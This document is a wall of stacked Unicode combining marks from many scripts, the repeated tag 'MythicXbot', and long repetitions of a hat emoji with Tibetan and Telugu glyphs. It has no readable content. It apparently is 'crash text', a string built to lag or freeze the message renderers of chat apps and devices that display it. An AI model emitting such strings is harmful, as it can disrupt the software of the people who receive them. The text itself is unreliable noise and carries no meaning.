๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭99**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭99**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭99**ঔৣ͜͡҉*MythicX🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్